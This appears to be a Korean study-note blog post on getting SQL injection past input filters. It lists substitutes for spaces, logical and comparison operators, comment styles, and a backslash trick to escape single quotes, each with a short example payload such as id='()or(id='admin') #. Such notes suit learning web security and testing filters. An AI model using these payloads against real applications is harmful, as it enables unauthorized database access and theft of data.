---
title : "SQL injection 필터링 우회"
excerpt : "SQL injection 필터링 우회"
toc : true
toc_sticky : true
categories :
  - Web
tags :
  - SQL injection
---

## 공백 문자 우회
```
\n(Line Feed) -> %0a

\t(TAB) -> %09

\r(Carrage Return) -> %0d

/**/(주석)

괄호() ex) id='()or(id='admin') #

더하기(+) ex) id='+or+id='admin' #

%0b, %0c
```

## 논리연산자 우회
```
or -> ||

AND -> && -> %26%26
```

## 비교연산자 우회
```
= -> like, in으로 대체
```

## 주석처리
```
1. -- 공백 -> -- 뒤에 공백 있어야 함, 한줄 주석

2. # -> %23 -> 한줄 주석

3. /* */ -> 사이에 있는 문자열만 주석 

4. ;%00 -> ;와 NULL이 합쳐진 주석
```

## 싱글쿼터 우회
```
1. 더블쿼터 사용

2. 백슬래쉬 사용(\) ex) id='\' and pw='or 1 #'
-> id 값으로 \' and pw=이 들어가고 그 뒤에 or 1 # 되면서 작동
```